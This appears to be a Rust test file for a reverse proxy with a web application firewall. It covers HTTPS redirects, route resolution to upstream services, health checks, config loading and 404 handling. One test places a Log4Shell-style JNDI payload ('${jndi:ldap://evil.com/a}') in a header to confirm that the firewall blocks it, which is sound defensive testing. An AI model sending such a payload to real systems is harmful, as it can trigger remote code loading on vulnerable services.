use ferrous_reverseproxy::config::ZentinelConfig;
use ferrous_reverseproxy::proxy::ReverseProxyService;
use ferrous_reverseproxy::redirect::RedirectService;
use ferrous_reverseproxy::router::Router;
use ferrous_reverseproxy::waf::WafEngine;
use http_body_util::{BodyExt, Empty};
use hyper::body::Bytes;
use hyper::header::{HOST, LOCATION};
use hyper::{Request, StatusCode};
use std::sync::Arc;

#[tokio::test]
async fn test_http_redirect_301_to_https() {
    let redirect = RedirectService::new(443);
    let req = Request::builder()
        .header(HOST, "ferrouscx.io")
        .uri("/api/v1/commands/orders/issue-credit?id=123")
        .body(())
        .unwrap();

    let res = redirect.handle_request(&req);
    assert_eq!(res.status(), StatusCode::MOVED_PERMANENTLY);
    assert_eq!(
        res.headers().get(LOCATION).unwrap(),
        "https://ferrouscx.io/api/v1/commands/orders/issue-credit?id=123"
    );
}

#[tokio::test]
async fn test_http_redirect_custom_port() {
    let redirect = RedirectService::new(8443);
    let req = Request::builder()
        .header(HOST, "localhost:8080")
        .uri("/login")
        .body(())
        .unwrap();

    let res = redirect.handle_request(&req);
    assert_eq!(res.status(), StatusCode::MOVED_PERMANENTLY);
    assert_eq!(
        res.headers().get(LOCATION).unwrap(),
        "https://localhost:8443/login"
    );
}

#[tokio::test]
async fn test_http_redirect_ipv6_host() {
    let redirect = RedirectService::new(443);
    let req = Request::builder()
        .header(HOST, "[::1]:80")
        .uri("/api/v1/ping")
        .body(())
        .unwrap();

    let res = redirect.handle_request(&req);
    assert_eq!(res.status(), StatusCode::MOVED_PERMANENTLY);
    assert_eq!(
        res.headers().get(LOCATION).unwrap(),
        "https://[::1]/api/v1/ping"
    );
}

#[tokio::test]
async fn test_router_path_prefixes() {
    let config = ZentinelConfig::default();
    let router = Router::new(&config);

    // /api/ -> ferrous-api:8080
    let api = router.resolve("/api/v1/events/stream").unwrap();
    assert_eq!(api.upstream_target, "ferrous-api:8080");
    assert!(api.unbuffered_streaming);

    // /api (no trailing slash) -> ferrous-api:8080
    let api_bare = router.resolve("/api").unwrap();
    assert_eq!(api_bare.upstream_target, "ferrous-api:8080");

    // /oauth2/ -> ferrous-iam:8443
    let oauth = router.resolve("/oauth2/token").unwrap();
    assert_eq!(oauth.upstream_target, "ferrous-iam:8443");

    // /oauth2 (no trailing slash) -> ferrous-iam:8443
    let oauth_bare = router.resolve("/oauth2").unwrap();
    assert_eq!(oauth_bare.upstream_target, "ferrous-iam:8443");

    // /auth/ -> ferrous-iam:8443
    let auth = router.resolve("/auth/session").unwrap();
    assert_eq!(auth.upstream_target, "ferrous-iam:8443");

    // /idp/ -> ferrous-iam:8443
    let idp = router.resolve("/idp/login").unwrap();
    assert_eq!(idp.upstream_target, "ferrous-iam:8443");

    // /v1/chat/ -> ferrous-agent:8081
    let agent = router.resolve("/v1/chat/completions").unwrap();
    assert_eq!(agent.upstream_target, "ferrous-agent:8081");
    assert!(agent.unbuffered_streaming);

    // / -> ferrous-frontend:5173
    let root = router.resolve("/").unwrap();
    assert_eq!(root.upstream_target, "ferrous-frontend:5173");

    let app = router.resolve("/_app/immutable/chunks/main.js").unwrap();
    assert_eq!(app.upstream_target, "ferrous-frontend:5173");
}

#[tokio::test]
async fn test_proxy_healthcheck_endpoint() {
    let config = ZentinelConfig::default();
    let router = Arc::new(Router::new(&config));
    let waf = Arc::new(WafEngine::new(true, true).unwrap());
    let proxy = ReverseProxyService::new(router, waf, 443);

    let client_addr = "127.0.0.1:12345".parse().unwrap();
    let req = Request::builder()
        .uri("/health")
        .body(Empty::<Bytes>::new())
        .unwrap();

    let res = proxy.handle_request(req, client_addr).await.unwrap();
    assert_eq!(res.status(), StatusCode::OK);

    let body_bytes = res.into_body().collect().await.unwrap().to_bytes();
    let body_str = String::from_utf8(body_bytes.to_vec()).unwrap();
    assert!(body_str.contains("healthy"));
}

#[tokio::test]
async fn test_proxy_healthz_endpoint() {
    let config = ZentinelConfig::default();
    let router = Arc::new(Router::new(&config));
    let waf = Arc::new(WafEngine::new(true, true).unwrap());
    let proxy = ReverseProxyService::new(router, waf, 443);

    let client_addr = "127.0.0.1:12345".parse().unwrap();
    let req = Request::builder()
        .uri("/healthz")
        .body(Empty::<Bytes>::new())
        .unwrap();

    let res = proxy.handle_request(req, client_addr).await.unwrap();
    assert_eq!(res.status(), StatusCode::OK);
}

#[tokio::test]
async fn test_proxy_waf_blocks_malicious_request() {
    let config = ZentinelConfig::default();
    let router = Arc::new(Router::new(&config));
    let waf = Arc::new(WafEngine::new(true, true).unwrap());
    let proxy = ReverseProxyService::new(router, waf, 443);

    let client_addr = "192.168.1.100:54321".parse().unwrap();
    let req = Request::builder()
        .header("X-Forwarded-For", "${jndi:ldap://evil.com/a}")
        .uri("/api/v1/commands/orders")
        .body(Empty::<Bytes>::new())
        .unwrap();

    let res = proxy.handle_request(req, client_addr).await.unwrap();
    assert_eq!(res.status(), StatusCode::FORBIDDEN);

    let body_bytes = res.into_body().collect().await.unwrap().to_bytes();
    let body_str = String::from_utf8(body_bytes.to_vec()).unwrap();
    assert!(body_str.contains("Blocked by OWASP CRS / Zentinel WAF"));
}

#[tokio::test]
async fn test_load_config_yaml_file() {
    let config = ZentinelConfig::load_from_file("config/zentinel.yaml").unwrap();
    assert_eq!(config.server.http_port, 80);
    assert_eq!(config.server.https_port, 443);
    assert!(config.waf.enabled);
    assert!(config.upstreams.contains_key("frontend"));
    assert!(config.upstreams.contains_key("api"));
    assert!(config.upstreams.contains_key("iam"));
    assert!(config.upstreams.contains_key("agent"));
}

#[tokio::test]
async fn test_proxy_unmatched_route_returns_404() {
    let mut config = ZentinelConfig::default();
    // Remove root catch-all route to test unmatched path
    config.routes.retain(|r| r.prefix != "/");
    let router = Arc::new(Router::new(&config));
    let waf = Arc::new(WafEngine::new(true, true).unwrap());
    let proxy = ReverseProxyService::new(router, waf, 443);

    let client_addr = "127.0.0.1:12345".parse().unwrap();
    let req = Request::builder()
        .uri("/unmatched/path")
        .body(Empty::<Bytes>::new())
        .unwrap();

    let res = proxy.handle_request(req, client_addr).await.unwrap();
    assert_eq!(res.status(), StatusCode::NOT_FOUND);
}
